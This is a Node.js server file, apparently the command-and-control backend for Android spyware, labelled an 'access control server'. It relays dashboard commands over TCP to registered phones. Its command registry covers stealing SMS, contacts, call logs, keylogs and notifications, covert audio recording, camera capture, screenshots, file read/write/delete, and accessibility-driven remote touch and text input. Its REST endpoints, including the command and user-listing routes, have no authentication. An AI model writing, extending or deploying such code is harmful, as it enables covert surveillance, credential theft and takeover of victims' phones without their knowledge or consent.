// ============================================
// ACCESS CONTROL SERVER
// Unified TCP Protocol for Android + Dashboard
// Protocol matches SocketManager.java exactly
// Android: raw TCP (net.Socket)
// Dashboard: WebSocket (TCP upgrade, same JSON protocol)
// ============================================

'use strict';

const express  = require('express');
const http     = require('http');
const net      = require('net');
const WebSocket = require('ws');
const cors     = require('cors');
const path     = require('path');
const fs       = require('fs');
const crypto   = require('crypto');
const mongoose = require('mongoose');
require('dotenv').config();

// ============================================
// CONFIG
// ============================================
const TCP_PORT  = parseInt(process.env.TCP_PORT)  || 6000;
const HTTP_PORT = parseInt(process.env.PORT)       || 5000;
const PING_INTERVAL  = 15000;   // ms – how often server pings clients
const PONG_TIMEOUT   = 45000;   // ms – drop if no pong received
const CMD_TIMEOUT_MS = 30000;   // ms – command timeout

// ============================================
// COMMAND REGISTRY  (all cmds from SocketManager.java)
// ============================================
const COMMANDS = {
    // General / Device
    ping:                      { category: 'system',       label: 'Ping',                  icon: '📡' },
    vibrate:                   { category: 'device',       label: 'Vibrate',               icon: '📳' },
    play_sound:                { category: 'device',       label: 'Play Sound',            icon: '🔊' },
    get_clipboard:             { category: 'data',         label: 'Get Clipboard',         icon: '📋' },
    set_clipboard:             { category: 'data',         label: 'Set Clipboard',         icon: '📋' },
    get_device_info:           { category: 'system',       label: 'Device Info',           icon: 'ℹ️'  },
    get_location:              { category: 'location',     label: 'Get Location',          icon: '📍' },
    get_installed_apps:        { category: 'data',         label: 'Installed Apps',        icon: '📦' },
    get_battery_info:          { category: 'system',       label: 'Battery Info',          icon: '🔋' },
    get_network_info:          { category: 'system',       label: 'Network Info',          icon: '🌐' },
    get_wifi_networks:         { category: 'system',       label: 'WiFi Networks',         icon: '📶' },
    get_system_info:           { category: 'system',       label: 'System Info',           icon: '💻' },
    // SMS
    get_all_sms:               { category: 'sms',          label: 'Get All SMS',           icon: '💬' },
    get_sms_from_number:       { category: 'sms',          label: 'SMS From Number',       icon: '💬' },
    send_sms:                  { category: 'sms',          label: 'Send SMS',              icon: '📤' },
    delete_sms:                { category: 'sms',          label: 'Delete SMS',            icon: '🗑️' },
    // Contacts
    get_all_contacts:          { category: 'contacts',     label: 'Get Contacts',          icon: '👥' },
    search_contacts:           { category: 'contacts',     label: 'Search Contacts',       icon: '🔍' },
    // Calls
    get_all_call_logs:         { category: 'calls',        label: 'All Call Logs',         icon: '📞' },
    get_call_logs_by_type:     { category: 'calls',        label: 'Call Logs By Type',     icon: '📞' },
    get_call_logs_from_number: { category: 'calls',        label: 'Calls From Number',     icon: '📞' },
    get_call_statistics:       { category: 'calls',        label: 'Call Statistics',       icon: '📊' },
    // Camera
    get_available_cameras:     { category: 'camera',       label: 'Available Cameras',     icon: '📷' },
    take_photo:                { category: 'camera',       label: 'Take Photo',            icon: '📷' },
    // Screenshot
    take_screenshot:           { category: 'screen',       label: 'Take Screenshot',       icon: '📸' },
    // Files
    list_files:                { category: 'files',        label: 'List Files',            icon: '📁' },
    read_file:                 { category: 'files',        label: 'Read File',             icon: '📄' },
    write_file:                { category: 'files',        label: 'Write File',            icon: '✏️'  },
    delete_file:               { category: 'files',        label: 'Delete File',           icon: '🗑️' },
    copy_file:                 { category: 'files',        label: 'Copy File',             icon: '📋' },
    move_file:                 { category: 'files',        label: 'Move File',             icon: '📦' },
    create_directory:          { category: 'files',        label: 'Create Directory',      icon: '📂' },
    get_file_info:             { category: 'files',        label: 'File Info',             icon: '📄' },
    search_files:              { category: 'files',        label: 'Search Files',          icon: '🔍' },
    // Audio
    start_recording:           { category: 'audio',        label: 'Start Recording',       icon: '🎤' },
    stop_recording:            { category: 'audio',        label: 'Stop Recording',        icon: '⏹️' },
    get_recording_status:      { category: 'audio',        label: 'Recording Status',      icon: '🎙️' },
    get_audio:                 { category: 'audio',        label: 'Get Audio',             icon: '🎵' },
    list_recordings:           { category: 'audio',        label: 'List Recordings',       icon: '🎵' },
    delete_recording:          { category: 'audio',        label: 'Delete Recording',      icon: '🗑️' },
    // Keylogs
    get_keylogs:               { category: 'keylog',       label: 'Get Keylogs',           icon: '⌨️' },
    clear_keylogs:             { category: 'keylog',       label: 'Clear Keylogs',         icon: '🧹' },
    // Notifications
    get_notifications:         { category: 'notifications',label: 'Get Notifications',     icon: '🔔' },
    get_notifications_from_app:{ category: 'notifications',label: 'Notifs From App',       icon: '🔔' },
    clear_notifications:       { category: 'notifications',label: 'Clear Notifications',   icon: '🧹' },
    // Screen Control (Accessibility)
    touch:                     { category: 'screen_ctrl',  label: 'Touch',                 icon: '👆' },
    swipe:                     { category: 'screen_ctrl',  label: 'Swipe',                 icon: '↔️' },
    press_back:                { category: 'screen_ctrl',  label: 'Press Back',            icon: '◀️' },
    press_home:                { category: 'screen_ctrl',  label: 'Press Home',            icon: '🏠' },
    press_recents:             { category: 'screen_ctrl',  label: 'Press Recents',         icon: '⬜' },
    open_notifications:        { category: 'screen_ctrl',  label: 'Open Notifications',    icon: '🔔' },
    open_quick_settings:       { category: 'screen_ctrl',  label: 'Open Quick Settings',   icon: '⚙️' },
    scroll_up:                 { category: 'screen_ctrl',  label: 'Scroll Up',             icon: '⬆️' },
    scroll_down:               { category: 'screen_ctrl',  label: 'Scroll Down',           icon: '⬇️' },
    input_text:                { category: 'screen_ctrl',  label: 'Input Text',            icon: '✏️' },
    click_by_text:             { category: 'screen_ctrl',  label: 'Click By Text',         icon: '🔍' },
    // Screen Reader (Accessibility)
    read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
    find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
    get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
    get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
    get_input_fields:          { category: 'screen_reader',label: 'Input Fields',          icon: '✏️'  },
    // Accessibility check
    get_accessibility_status:  { category: 'system',       label: 'Accessibility Status',  icon: '♿' }
};

// ============================================
// MONGOOSE MODELS
// ============================================
const Device      = require('./models/Device');
const User        = require('./models/User');
const Command     = require('./models/Command');
const ActivityLog = require('./models/ActivityLog');

const authRoutes    = require('./routes/auth');
const devicesRoutes = require('./routes/devices');

mongoose.connect(process.env.MONGODB_URI || process.env.MONGODB_URL || 'mongodb://localhost:27017/access-control', {
    serverSelectionTimeoutMS: 5000,
    socketTimeoutMS: 45000
}).then(() => log('DB', 'MongoDB connected'))
  .catch(e => log('DB', 'MongoDB unavailable: ' + e.message, 'warn'));

// ============================================
// STATE
// Separate maps for TCP (Android) vs WS (Dashboard)
// ============================================
/** @type {Map<string, net.Socket & {id:string, deviceId?:string, clientType:'android', lastPong:number, buf:string}>} */
const tcpClients = new Map();          // connId → TCP socket
/** @type {Map<string, WebSocket & {id:string, deviceId?:string, clientType:'dashboard', lastPong:number}>} */
const wsClients  = new Map();          // clientId → WebSocket
/** @type {Map<string, string>} */
const deviceToTcp = new Map();         // deviceId → TCP connId
/** @type {Map<string, {wsId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
const pendingCmds = new Map();         // commandId → pending info

// ============================================
// LOGGING HELPERS
// ============================================
function log(tag, msg, level = 'info') {
    const ts = new Date().toISOString().slice(11, 23);
    const fn = level === 'warn' ? console.warn : level === 'error' ? console.error : console.log;
    fn(`[${ts}][${tag}] ${msg}`);
}

// ============================================
// PROTOCOL HELPERS
// Both TCP and WS use the same JSON envelope:
//   { "event": "...", "data": { ... } }
// TCP: newline-terminated strings  (SocketManager.java style)
// WS:  WebSocket text frames       (same JSON, no newline needed)
// ============================================

/** Send a protocol message to a TCP (Android) client */
function tcpSend(conn, event, data) {
    if (conn && conn.writable) {
        conn.write(JSON.stringify({ event, data }) + '\n');
    }
}

/** Send a protocol message to a WebSocket (Dashboard) client */
function wsSend(ws, event, data) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ event, data }));
    }
}

/** Broadcast an event to ALL connected dashboard WS clients */
function broadcastDash(event, data) {
    for (const ws of wsClients.values()) {
        wsSend(ws, event, data);
    }
}

// ============================================
// SHARED MESSAGE PROCESSOR
// Both TCP and WS messages go through here
// ============================================
async function processMessage(clientId, clientType, event, data) {
    log(clientType === 'android' ? 'TCP' : 'WS',
        `← [${clientId}] ${event}`);

    // ── Events expected from Android (TCP) ──────────────────────────
    if (event === 'device:register') {
        const { deviceId, deviceInfo } = data || {};
        if (!deviceId) return;

        // Link this TCP connection to the deviceId
        const conn = tcpClients.get(clientId);
        if (conn) {
            conn.deviceId = deviceId;
            conn.lastPong = Date.now();
            deviceToTcp.set(deviceId, clientId);
        }

        // Persist / update
        try {
            let dev = await Device.findOne({ deviceId });
            const info = { model: deviceInfo?.model, manufacturer: deviceInfo?.manufacturer,
                           androidVersion: deviceInfo?.androidVersion, name: deviceInfo?.name };
            if (!dev) {
                dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
                                   deviceInfo: info, isOnline: true });
            } else {
                dev.isOnline  = true;
                dev.lastSeen  = new Date();
                dev.deviceInfo = { ...dev.deviceInfo, ...info };
            }
            await dev.save();
        } catch (e) { log('DB', 'save error: ' + e.message, 'warn'); }

        // Ack back to device
        if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId });

        // Notify dashboards
        broadcastDash('device:connected', { deviceId, deviceInfo, timestamp: new Date() });
        broadcastDeviceList();
        return;
    }

    if (event === 'device:heartbeat') {
        const { deviceId } = data || {};
        if (!deviceId) return;
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        try { await Device.findOneAndUpdate({ deviceId }, { lastSeen: new Date(), isOnline: true }); } catch (e) {}
        broadcastDash('device:heartbeat', { deviceId, timestamp: new Date() });
        return;
    }

    if (event === 'device:pong') {
        const conn = tcpClients.get(clientId);
        if (conn) conn.lastPong = Date.now();
        return;
    }

    // ── Command response from Android ───────────────────────────────
    if (event === 'command:response') {
        const { commandId, response, error } = data || {};
        if (!commandId) return;

        // Find which device this conn belongs to
        const conn = tcpClients.get(clientId);
        const deviceId = conn?.deviceId;

        // Update DB
        try {
            await Command.findOneAndUpdate(
                { id: commandId },
                { status: error ? 'failed' : 'success', response, error, completedAt: new Date() }
            );
        } catch (e) {}

        // Route result to the waiting dashboard socket
        const pending = pendingCmds.get(commandId);
        if (pending) {
            clearTimeout(pending.timer);
            pendingCmds.delete(commandId);

            const ws = wsClients.get(pending.wsId);
            const result = { commandId, command: pending.command, deviceId,
                             response, error: error || null, success: !error,
                             timestamp: new Date() };
            if (ws) wsSend(ws, 'command:result', result);

            // Also log to all dashboards
            broadcastDash('activity:log', {
                type: 'command_result', deviceId, command: pending.command,
                commandId, success: !error, timestamp: new Date()
            });
        }
        return;
    }

    // ── Events expected from Dashboard (WS) ─────────────────────────
    if (event === 'dashboard:get_devices') {
        const ws = wsClients.get(clientId);
        if (ws) await sendDeviceListTo(ws);
        return;
    }

    if (event === 'commands:get_registry') {
        const ws = wsClients.get(clientId);
        if (ws) wsSend(ws, 'commands:registry', COMMANDS);
        return;
    }

    if (event === 'command:send') {
        const { deviceId, command, params } = data || {};
        const ws = wsClients.get(clientId);
        if (!ws) return;

        if (!deviceId || !command) {
            wsSend(ws, 'command:error', { message: 'deviceId and command are required' });
            return;
        }
        if (!COMMANDS[command]) {
            wsSend(ws, 'command:error', { message: `Unknown command: ${command}` });
            return;
        }

        // Find the TCP connection for this device
        const tcpConnId = deviceToTcp.get(deviceId);
        const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;

        if (!tcpConn || !tcpConn.writable) {
            wsSend(ws, 'command:error', { commandId: null, message: 'Device is offline', deviceId, command });
            return;
        }

        const commandId = crypto.randomBytes(12).toString('hex');

        // Save to DB
        try {
            await new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save();
        } catch (e) {}

        // Forward to Android device via TCP (matching SocketManager.java processMessage)
        tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });

        // Track pending
        const timer = setTimeout(() => {
            if (pendingCmds.has(commandId)) {
                pendingCmds.delete(commandId);
                wsSend(ws, 'command:result', { commandId, command, deviceId,
                    success: false, error: 'Command timed out', timestamp: new Date() });
            }
        }, CMD_TIMEOUT_MS);
        pendingCmds.set(commandId, { wsId: clientId, command, deviceId, timer });

        wsSend(ws, 'command:sent', { commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
        log('CMD', `${command} → ${deviceId} [${commandId}]`);
        return;
    }

    log('MSG', `Unhandled event: ${event}`, 'warn');
}

// ============================================
// TCP SERVER — Android devices
// ============================================
const tcpServer = net.createServer((conn) => {
    const id = crypto.randomBytes(8).toString('hex');
    conn.id          = id;
    conn.clientType  = 'android';
    conn.lastPong    = Date.now();
    conn.buf         = '';
    tcpClients.set(id, conn);
    log('TCP', `New Android connection ${id} from ${conn.remoteAddress}`);

    conn.setEncoding('utf8');

    conn.on('data', (chunk) => {
        conn.buf += chunk;
        let idx;
        while ((idx = conn.buf.indexOf('\n')) !== -1) {
            const line = conn.buf.slice(0, idx).trim();
            conn.buf = conn.buf.slice(idx + 1);
            if (!line) continue;
            let msg;
            try { msg = JSON.parse(line); } catch (e) { continue; }
            processMessage(id, 'android', msg.event, msg.data);
        }
    });

    conn.on('close', async () => {
        log('TCP', `Disconnected ${id} (device: ${conn.deviceId || 'unregistered'})`);
        tcpClients.delete(id);
        if (conn.deviceId) {
            deviceToTcp.delete(conn.deviceId);
            try {
                await Device.findOneAndUpdate({ deviceId: conn.deviceId },
                    { isOnline: false, lastSeen: new Date() });
            } catch (e) {}
            broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
            broadcastDeviceList();
        }
    });

    conn.on('error', (e) => log('TCP', `Error on ${id}: ${e.message}`, 'error'));
});

tcpServer.listen(TCP_PORT, '0.0.0.0', () =>
    log('TCP', `Android device server listening on 0.0.0.0:${TCP_PORT}`));

// ============================================
// HTTP + WEBSOCKET SERVER — Dashboard
// ============================================
const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server, path: '/ws' });

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));
app.use('/api/auth', authRoutes);
app.use('/api/user', devicesRoutes);

wss.on('connection', async (ws, req) => {
    const id = crypto.randomBytes(8).toString('hex');
    ws.id         = id;
    ws.clientType = 'dashboard';
    ws.lastPong   = Date.now();
    wsClients.set(id, ws);
    log('WS', `Dashboard connected ${id} from ${req.socket.remoteAddress}`);

    // Immediately send device list + command registry
    await sendDeviceListTo(ws);
    wsSend(ws, 'commands:registry', COMMANDS);

    ws.on('message', (raw) => {
        let msg;
        try { msg = JSON.parse(raw.toString()); } catch (e) { return; }
        processMessage(id, 'dashboard', msg.event, msg.data);
    });

    ws.on('pong', () => { ws.lastPong = Date.now(); });

    ws.on('close', () => {
        log('WS', `Dashboard disconnected ${id}`);
        wsClients.delete(id);
        // Clean up pending commands owned by this socket
        for (const [cid, p] of pendingCmds) {
            if (p.wsId === id) { clearTimeout(p.timer); pendingCmds.delete(cid); }
        }
    });

    ws.on('error', (e) => log('WS', `Error on ${id}: ${e.message}`, 'error'));
});

// ============================================
// REST ENDPOINTS
// ============================================
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await Device.find().sort({ lastSeen: -1 });
        res.json({ success: true, devices });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('/api/devices/:deviceId', async (req, res) => {
    try {
        const device = await Device.findOne({ deviceId: req.params.deviceId });
        if (!device) return res.status(404).json({ success: false, error: 'Device not found' });
        res.json({ success: true, device });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.post('/api/commands', async (req, res) => {
    const { deviceId, command, params } = req.body;
    if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
    if (!COMMANDS[command]) return res.status(400).json({ error: `Unknown command: ${command}` });

    const tcpConnId = deviceToTcp.get(deviceId);
    const tcpConn   = tcpConnId ? tcpClients.get(tcpConnId) : null;
    if (!tcpConn || !tcpConn.writable) return res.status(503).json({ error: 'Device offline', deviceId });

    const commandId = crypto.randomBytes(12).toString('hex');
    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });

    try { await new Command({ id: commandId, deviceId, command, data: params || {}, status: 'executing' }).save(); } catch (e) {}
    res.json({ success: true, commandId, status: 'executing' });
});

app.get('/api/commands/registry', (req, res) => res.json({ success: true, commands: COMMANDS }));

app.get('/api/health', (req, res) => res.json({
    status: 'ok',
    mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
    tcpClients: tcpClients.size,
    wsClients: wsClients.size,
    connectedDevices: deviceToTcp.size,
    pendingCommands: pendingCmds.size,
    tcpPort: TCP_PORT,
    httpPort: HTTP_PORT,
    uptime: process.uptime()
}));

app.get('/api/admin/users', async (req, res) => {
    try {
        const users = await User.find({}, '-password').sort({ createdAt: -1 });
        res.json({ success: true, users });
    } catch (e) { res.status(500).json({ success: false, error: e.message }); }
});

app.get('*', (req, res) => {
    const fp = path.join(__dirname, '../frontend', req.path);
    if (fs.existsSync(fp) && fs.statSync(fp).isFile()) res.sendFile(fp);
    else res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// ============================================
// DB HELPERS
// ============================================
async function broadcastDeviceList() {
    try {
        const devices = await Device.find().sort({ lastSeen: -1 });
        broadcastDash('device:list', devices);
    } catch (e) {}
}

async function sendDeviceListTo(ws) {
    try {
        const devices = await Device.find().sort({ lastSeen: -1 });
        wsSend(ws, 'device:list', devices);
    } catch (e) { wsSend(ws, 'device:list', []); }
}

// ============================================
// PERIODIC TASKS
// ============================================

// Ping TCP clients (Android devices)
setInterval(() => {
    for (const conn of tcpClients.values()) {
        if (conn.writable) tcpSend(conn, 'device:ping', { timestamp: Date.now() });
    }
}, PING_INTERVAL);

// Ping WS clients (dashboards)
setInterval(() => {
    for (const ws of wsClients.values()) {
        if (ws.readyState === WebSocket.OPEN) ws.ping();
    }
}, PING_INTERVAL);

// Drop stale TCP connections
setInterval(async () => {
    const now = Date.now();
    for (const [id, conn] of tcpClients) {
        if (!conn.deviceId) continue;
        if (now - conn.lastPong > PONG_TIMEOUT) {
            log('TCP', `Device ${conn.deviceId} timed out, dropping`);
            tcpClients.delete(id);
            deviceToTcp.delete(conn.deviceId);
            conn.destroy();
            try { await Device.findOneAndUpdate({ deviceId: conn.deviceId }, { isOnline: false, lastSeen: new Date() }); } catch (e) {}
            broadcastDash('device:disconnected', { deviceId: conn.deviceId, timestamp: new Date() });
            broadcastDeviceList();
        }
    }
}, 10000);

// Mark DB devices offline if not seen in 60s
setInterval(async () => {
    try {
        const cutoff = new Date(Date.now() - 60000);
        await Device.updateMany({ lastSeen: { $lt: cutoff }, isOnline: true }, { isOnline: false });
    } catch (e) {}
}, 30000);

// ============================================
// START
// ============================================
server.listen(HTTP_PORT, () => {
    log('HTTP', `Server running on port ${HTTP_PORT}`);
    log('HTTP', `Dashboard → ws://localhost:${HTTP_PORT}/ws`);
    log('TCP',  `Android devices → localhost:${TCP_PORT}`);
});

process.on('SIGINT', async () => {
    log('SHUTDOWN', 'Closing...');
    await mongoose.connection.close();
    process.exit(0);
});

module.exports = { app, server, wss };
